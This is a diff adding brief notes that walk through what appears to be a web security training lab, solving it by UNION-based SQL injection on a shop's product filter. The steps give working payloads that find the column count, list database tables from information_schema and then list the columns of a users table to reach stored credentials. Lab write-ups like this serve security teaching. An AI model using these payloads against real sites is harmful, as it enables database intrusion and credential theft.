@@ -1,0 +1,8 @@
+click on Pets button
+add a ' to sitelink --> if you get an error
+type UNION+SELECT+'abc','def'-- to sitelink --> you should get abc and dep columns in bottom of the site 
+now type this UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- --> for finding table names from database
+then find users credential it is users_abcdef 
+type '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- --> for finding column names from database
+
+and congratulations you completed the lab
